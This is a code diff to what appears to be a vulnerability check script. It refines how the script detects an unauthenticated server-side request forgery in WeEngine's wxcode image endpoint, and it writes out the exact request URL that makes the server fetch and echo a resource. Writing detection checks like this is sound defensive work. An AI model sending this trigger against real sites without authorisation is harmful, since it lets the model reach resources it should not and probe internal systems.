@@ -61,11 +61,15 @@ def http_get(url, timeout=15):
 
 def check(base, timeout=15):
     base = base.rstrip("/")
-    target = base + "/web/index.php"                       # fetch the site itself
+    # Fetch a WeEngine-only JSON resource (the module list) instead of the index
+    # page: the echo then has to be that JSON envelope, so a generic HTML page
+    # cannot be mistaken for "the server fetched and echoed something".
+    target = base + "/web/index.php?c=utility&a=modules&do=list"
     url = f"{base}/web/index.php?c=utility&a=wxcode&do=image&attach={urllib.parse.quote(target, safe='')}"
     status, body = http_get(url, timeout)
-    low = body.lower()
-    echoed = status == 200 and len(body) > 500 and (b"<html" in low or b"<!doctype" in low)
+    text = body.decode("utf-8", "replace").strip()
+    is_we7_json = text.startswith("{") and ('"errno"' in text or '"items"' in text)
+    echoed = status == 200 and is_we7_json and "<html" not in text.lower()
     return {
         "target": base,
         "check": "WE7-2 wxcode unauthenticated SSRF with response echo",
